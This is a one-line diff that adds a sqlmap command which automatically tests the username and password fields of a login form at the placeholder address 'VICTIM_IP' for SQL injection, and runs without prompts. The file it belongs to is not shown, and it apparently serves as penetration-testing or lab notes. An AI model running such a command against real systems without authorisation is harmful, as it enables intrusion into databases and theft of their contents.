@@ -1,0 +1,1 @@
+sqlmap -u "http://VICTIM_IP" --data "username=*&password=*" --batch
